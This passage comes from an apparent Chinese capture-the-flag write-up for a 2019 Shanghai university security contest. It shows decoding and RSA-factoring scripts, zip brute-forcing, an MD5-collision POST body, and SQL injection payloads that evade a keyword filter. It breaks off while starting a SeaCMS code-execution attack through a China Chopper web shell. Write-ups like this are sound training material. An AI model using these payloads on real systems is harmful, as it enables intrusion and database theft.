b1dGbFVRWGhUUmtweVdrWm9hV0Y2Vm5oV1ZFSnZVVEZzVjFWc1dsaGlWVnB6V1d0YWQyVkdWWGxrUjNSb1lsVndWMWx1Y0V0V2JGbDZZVVJPV21FeVVrZGFWM2hIWTIxS1IyRkdhRlJTVlhCS1ZtMTBVMU14VlhoWFdHaFhZbXhhVjFsc2FFTldSbXhaWTBaa2EwMVdjREJaTUZZd1lWVXhXRlZyYUZkTmFsWlVWa2Q0UzFKc1pIVlRiRlpYWWtoQ05sWkhlR0ZaVm1SR1RsWmFVRlp0YUZSWmJGcExVMnhhYzFwRVVtcE5WMUl3VlRKMGIyRkdTbk5UYlVaVlZteHdNMVpyV21GalZrcDFXa1pPVGxacmIzZFhiRlpyWXpGVmVWTnNiRnBOTW1oWVZGWmFTMVZHY0VWU2EzQnNVbTFTV2xkclZURldNVnB6WTBaV1dGWXpVbkpXVkVaelZqRldjMWRzYUdsV1ZuQlFWa1phWVdReVZrZFdibEpzVTBkU2NGVnFRbmRXTVZsNVpFaGtWMDFFUmpGWlZWSlBWMjFGZVZWclpHRldNMmhJV1RKemVGWXhjRWRhUlRWT1VsaENTMVp0TVRCVk1VMTRWVzVTVjJFeVVtaFZNRnBoVmpGc2MxcEVVbGRTYlhoYVdUQmFhMWRHV25OalJteGFUVVpWTVZsV1ZYaFhSbFp6WVVaa1RsWXlhREpXTVZwaFV6RkplRlJ1VmxKaVJscFlXV3RvUTFkV1draGtSMFpvVFdzMWVsWXlOVk5oTVVsNVlVWm9XbFpGTlVSVk1WcHJWbFpHZEZKc1drNVdNVWwzVmxkNGIySXhXWGhhUldob1VtMW9WbFpzV25kTk1XeFdWMjVrVTJKSVFraFdSM2hUVlRKRmVsRllaRmhpUmxweVdYcEdWbVZXVG5KYVIyaE9UVzFvV1ZaR1l6RlZNV1JIVjJ4V1UyRXhjSE5WYlRGVFYyeGtjbFpVUmxkTmEzQktWVmMxYjFZeFdqWlNWRUpoVWtWYWNsVnFTa3RUVmxKMFlVWk9hR1ZzV2pSV2JUQjRaV3N4V0ZadVRsaGlSMmh4V2xkNFlWWXhVbGRYYlVaWFZteHdlbGxWYUd0V2F6RldWbXBTVjJKWVFtaFdiVEZHWkRGYWRWUnNWbGRTVlhCVVYxZDBWbVF5VVhoV2JGSlhWMGhDVkZWV1RsWmxiRXBFVmxod1UxRlRWWHBTUTFWNlVrRWxNMFFsTTBRJTNE'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="string">'%'</span> <span class="keyword">in</span> s:</span><br><span class="line">        s = urllib.parse.unquote(s)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = base64.b64decode(s)	<span class="comment">#完成后，s变为byte类型</span></span><br><span class="line">        s = s.decode()	<span class="comment">#s转换成string类型，否则while处无法使用</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> s</span><br></pre></td></tr></table></figure>
+<p>果然可以得到flag</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/4-3.png" alt="4-3"></p>
+<p>但是这个flag还经过栅栏密码处理，找个在线网站解密一下就可以：<a href="https://www.qqxiuzi.cn/bianma/zhalanmima.php" target="_blank" rel="noopener">栅栏密码传送门</a></p>
+<p>组数为5时得到我们的flag</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/4-4.png" alt="4-4"></p>
+<p><code>flag{B64_&amp;_2hai_14i}</code></p>
+<hr>
+<h3 id="第五题（飞虎队）"><a href="#第五题（飞虎队）" class="headerlink" title="第五题（飞虎队）"></a>第五题（飞虎队）</h3><p>Crypto — 希尔加密</p>
+<p>关于解密过程：<a href="http://2-dreamfever.lofter.com/post/1d226cf1_748daf4?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">希尔加密WriteUp</a></p>
+<p>矩阵行列式求法：</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/5-2.png" alt="5-2"></p>
+<p>关于最小公倍数：</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/5-3.png" alt="5-3"></p>
+<p>本题的<code>WriteUp</code>看前文提供的那2篇</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/5-1.png" alt="5-1"></p>
+<hr>
+<h3 id="第六题（戴星炳）"><a href="#第六题（戴星炳）" class="headerlink" title="第六题（戴星炳）"></a>第六题（戴星炳）</h3><p>算式的内容每2秒就会变，所以需要通过python的Session机制提交计算结果</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/6-1.png" alt="6-1"></p>
+<p>代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,re</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">a = requests.Session()</span><br><span class="line">url = <span class="string">"http://47.103.43.235:82/web/a/index.php"</span></span><br><span class="line">b = a.get(url)</span><br><span class="line">soup = BeautifulSoup(b.text,<span class="string">'lxml'</span>)</span><br><span class="line">c = re.findall(<span class="string">'&lt;p&gt;(.*)&lt;/p&gt;'</span>,str(soup.find_all(<span class="string">'p'</span>)[<span class="number">1</span>]))[<span class="number">0</span>]</span><br><span class="line">result = eval(c)</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">'result'</span>:result</span><br><span class="line">    &#125;</span><br><span class="line">d = a.post(url,data=data)</span><br><span class="line">print(d.text)</span><br></pre></td></tr></table></figure>
+<p>运行一下flag就出来了</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/6-2.png" alt="6-2"></p>
+<p><code>flag{Y0U_4R3_3o_F4ST!}</code></p>
+<hr>
+<h3 id="第七题（大美晚报）"><a href="#第七题（大美晚报）" class="headerlink" title="第七题（大美晚报）"></a>第七题（大美晚报）</h3><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/7-1.png" alt="7-1"></p>
+<p>将这张二维码保存下来，用手机扫描没有可用信息。用winhex打开，发现有藏着zip文件</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/7-2.png" alt="7-2"></p>
+<p>foremost直接提取出来一个zip文件。放入winhex中，将屁股后面多余的0删除掉</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/7-3.png" alt="7-3"></p>
+<p>Ps：这里要记得删除屁股后面多余的0，不然注释信息显示不出来用foremost提取出来会多出很多0，用binwalk -e就不会，不知道为什么</p>
+<p>尝试提取内容时，却发现是加密的。但是提示”管理员用了他的QQ号进行加密”</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/7-4.png" alt="7-4"></p>
+<p>不知道管理员的QQ号，那就爆破，一般QQ号9位-11位，先从9位开始</p>
+<p>Ps：这里的-u需要特地加上去，因为不加上去不以zip格式爆破</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fcracker -b -c 1 -l 9 -v -u 文件名</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/7-5.png" alt="7-5"></p>
+<p>输入密码，拿到文件，打开看到flag</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/7-6.png" alt="7-6"></p>
+<p><code>flag{Y0U_4R3_3o_F4ST!}</code></p>
+<hr>
+<h3 id="第八题（潘汉年）"><a href="#第八题（潘汉年）" class="headerlink" title="第八题（潘汉年）"></a>第八题（潘汉年）</h3><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/8-1.png" alt="8-1"></p>
+<p>做个简单的测试，将代码前4个字符和flag的ASCII码进行对比，代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">"bg[`"</span></span><br><span class="line">b = <span class="string">"flag"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">    print(<span class="string">"密文:"</span>+ str(ord(a[i])))</span><br><span class="line">    print(<span class="string">"========"</span>)</span><br><span class="line">    print(<span class="string">"flag:"</span>+ str(ord(b[i])))</span><br><span class="line">    print(<span class="string">""</span>)</span><br></pre></td></tr></table></figure>
+<p>发现逐位在漂移为 4 的基础上 + 1</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/8-2.png" alt="8-2"></p>
+<p>根据这个还原flag，代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">"bg[`sZ*Zg'dPfP`VM_SXVd"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line">    flag += chr(ord(a[i])+<span class="number">4</span>+i)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
+<p>拿到flag</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/8-3.png" alt="8-3"></p>
+<p><code>flag{c4es4r_variation}</code></p>
+<hr>
+<h3 id="第九题（袁殊）"><a href="#第九题（袁殊）" class="headerlink" title="第九题（袁殊）"></a>第九题（袁殊）</h3><p>RSA 摸熟 n 过小，导致可被分解的问题，先用 openssl 提取公钥中的 e 和 n</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">openssl rsa -pubin -text -modulus -in warmup -in gy.key</span><br><span class="line"></span><br><span class="line">Public-Key: (256 bit)</span><br><span class="line">Modulus:</span><br><span class="line">    00:a9:bd:4c:7a:77:63:37:0a:04:2f:e6:be:c7:dd:</span><br><span class="line">    c8:41:60:2d:b9:42:c7:a3:62:d1:b5:d3:72:a4:d0:</span><br><span class="line">    89:12:d9</span><br><span class="line">Exponent: 65537 (0x10001)</span><br><span class="line">Modulus=A9BD4C7A7763370A042FE6BEC7DDC841602DB942C7A362D1B5D372A4D08912D9</span><br><span class="line">writing RSA key</span><br><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAKm9THp3YzcKBC/mvsfdyEFgLblCx6Ni</span><br><span class="line">0bXTcqTQiRLZAgMBAAE=</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure>
+<p>在 factordb.com 分解 n 得到素因子 p 和 q， 解得私钥 d，再解得明文 m</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">0xA9BD4C7A7763370A042FE6BEC7DDC841602DB942C7A362D1B5D372A4D08912D9</span></span><br><span class="line"></span><br><span class="line">p = <span class="number">273821108020968288372911424519201044333</span></span><br><span class="line">q = <span class="number">280385007186315115828483000867559983517</span></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line"><span class="keyword">assert</span> GCD(e, phi) == <span class="number">1</span></span><br><span class="line">d = inverse(e, phi)</span><br><span class="line"></span><br><span class="line">c = open(<span class="string">'E:\\Downloads\\CTF\\RSA256\\fllllllag.txt'</span>, <span class="string">'rb'</span>).read()</span><br><span class="line">c = bytes_to_long(c)</span><br><span class="line">m = pow(c, d, n)</span><br><span class="line"><span class="keyword">print</span> long_to_bytes(m)</span><br></pre></td></tr></table></figure>
+<p><code>flag{_2o!9_CTF_ECUN_}</code></p>
+<hr>
+<h3 id="第十题（76号）"><a href="#第十题（76号）" class="headerlink" title="第十题（76号）"></a>第十题（76号）</h3><p>Reverse</p>
+<hr>
+<h3 id="第十一题-（晴气庆胤）"><a href="#第十一题-（晴气庆胤）" class="headerlink" title="第十一题 （晴气庆胤）"></a>第十一题 （晴气庆胤）</h3><p>查看源代码，给出了提示</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/11-1.png" alt="11-1"></p>
+<p>要POST值不同的2个数，但是md5的值却要一样，参考了这篇文章：<a href="https://xz.aliyun.com/t/2232" target="_blank" rel="noopener">不同数值构造相同MD5传送门</a></p>
+<p>按照文章步骤来，创建文本文件，写入1，命令为init.txt</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/11-2.png" alt="11-2"></p>
+<p>运行fastcoll 输入以下参数。 -p 是源文件 -o 是输出文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastcoll_v1.0.0.5.exe -p init.txt -o 1.txt 2.txt</span><br></pre></td></tr></table></figure>
+<p>文件生成</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/11-3.png" alt="11-3"></p>
+<p>通过下面这个代码，生成两个hash一样，但是实际内容不一样的字符串：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">readmyfile</span><span class="params">($path)</span></span>&#123;</span><br><span class="line">    $fh = fopen($path, <span class="string">"rb"</span>);</span><br><span class="line">    $data = fread($fh, filesize($path));</span><br><span class="line">    fclose($fh);</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'二进制hash '</span>. md5( (readmyfile(<span class="string">"1.txt"</span>)));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span>  <span class="string">'URLENCODE '</span>. urlencode(readmyfile(<span class="string">"1.txt"</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'URLENCODE hash '</span>.md5(urlencode (readmyfile(<span class="string">"1.txt"</span>)));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'二进制hash '</span>.md5( (readmyfile(<span class="string">"2.txt"</span>)));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span>  <span class="string">'URLENCODE '</span>.  urlencode(readmyfile(<span class="string">"2.txt"</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'URLENCODE hash '</span>.md5( urlencode(readmyfile(<span class="string">"2.txt"</span>)));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;\r\n"</span>;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/11-4.png" alt="11-4"></p>
+<p>然后直接POST提交param1和param2</p>
+<p>内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">param1=1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%8D%13%BE%8Fu%F7s%3B%60v%7E%BD%C46%B6%BA%CCyrer%F69%C84%2Az%92PB%97%ED%0D%09%AD%CD%DD%02%8C%A1%C7%CBG%D9%EF%F5%7C9%D5K%BAK%C6%C7N%3Be%93%F8P%5BH%27Qk%1Cr%80%9F-r%8D%0B%AC%D0aW%7F%13h+%7F%BCz%13%86F%AF%CB%1An%CB%EC%86%02%F0%0E%26%A6%D8%F6%D1%E3O%88%8C9w%C8%E4%C5f2%FA%ED%2B%02%E6%91%0E%CC%5C%9E%F4%EFzG%9B&amp;param2=1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%8D%13%BE%8Fu%F7s%3B%60v%7E%BD%C46%B6%BA%CCyr%E5r%F69%C84%2Az%92PB%97%ED%0D%09%AD%CD%DD%02%8C%A1%C7%CBG%D9%EFu%7D9%D5K%BAK%C6%C7N%3Be%93%F8%D0%5BH%27Qk%1Cr%80%9F-r%8D%0B%AC%D0aW%7F%13h+%7F%BC%FA%13%86F%AF%CB%1An%CB%EC%86%02%F0%0E%26%A6%D8%F6%D1%E3O%88%8C9w%C8d%C5f2%FA%ED%2B%02%E6%91%0E%CC%5C%9Et%EFzG%9B</span><br></pre></td></tr></table></figure>
+<p>拿下flag</p>
+<p><code>flag{MD5@_@success}</code></p>
+<hr>
+<h3 id="第十二题（梅津美治郎）"><a href="#第十二题（梅津美治郎）" class="headerlink" title="第十二题（梅津美治郎）"></a>第十二题（梅津美治郎）</h3><p>Reverse</p>
+<hr>
+<h3 id="第十三题（冈村宁次）"><a href="#第十三题（冈村宁次）" class="headerlink" title="第十三题（冈村宁次）"></a>第十三题（冈村宁次）</h3><p>题目的链接如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.103.43.235:83/web/a/index.php?id===QM</span><br></pre></td></tr></table></figure>
+<p>发现”id=”后面是奇怪的”==QM”。这其实是1经过base64加密后再逆序</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/10-1.png" alt="10-1"></p>
+<p>测试发现，以下内容被检查，无法使用：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">extractvalue()函数，updatexml()函数</span><br><span class="line"></span><br><span class="line">union,select,空格,逗号,等号</span><br></pre></td></tr></table></figure>
+<p>应对策略：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">双写：uunionnion,sselectelect</span><br><span class="line">空格：使用/**/或者%09代替空格</span><br><span class="line">逗号：select()a join select ()b来代替逗号</span><br><span class="line">等号：like代替等号</span><br></pre></td></tr></table></figure>
+<p>爆表名：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">base64.b64encode(&quot;0 uunionnion/**/sselectelect/**/*/**/from/**/((sselectelect/**/database())a/**/join/**/(sselectelect/**/2)b/**/join/**/(sselectelect/**/3)c/**/join/**/(sselectelect/**/4)d/**/join/**/(sselectelect/**/5)e/**/join/**/(sselectelect/**/group_concat(table_name)/**/from/**/infoorrmation_schema.tables/**/where/**/table_schema/**/like/**/database())f)&quot;)[::-1]</span><br><span class="line"></span><br><span class="line">#表名：book,flag</span><br></pre></td></tr></table></figure>
+<p>爆列名：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">base64.b64encode(&quot;0/**/uunionnion/**/sselectelect/**/*/**/from/**/((sselectelect/**/database())a/**/join/**/(sselectelect/**/2)b/**/join/**/(sselectelect/**/3)c/**/join/**/(sselectelect/**/4)d/**/join/**/(sselectelect/**/5)e/**/join/**/(sselectelect/**/group_concat(column_name)/**/from/**/infoorrmation_schema.columns/**/where/**/table_name/**/like/**/0x666c6167)f)&quot;)[::-1]</span><br><span class="line"></span><br><span class="line">#列名：flag</span><br></pre></td></tr></table></figure>
+<p>爆flag值：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base64.b64encode(&quot;0/**/uunionnion/**/sselectelect/**/*/**/from/**/((sselectelect/**/database())a/**/join/**/(sselectelect/**/2)b/**/join/**/(sselectelect/**/3)c/**/join/**/(sselectelect/**/4)d/**/join/**/(sselectelect/**/5)e/**/join/**/(sselectelect/**/flag/**/from/**/flag)f)&quot;)[::-1]</span><br></pre></td></tr></table></figure>
+<p><code>flag{s9li_1s_s0_e4sY}</code></p>
+<hr>
+<h3 id="第十四题（作战计划）"><a href="#第十四题（作战计划）" class="headerlink" title="第十四题（作战计划）"></a>第十四题（作战计划）</h3><p>之前看过海洋CMS v6.28 存在代码执行漏洞，参考文章后，菜刀直接连接，密码为1：</p>
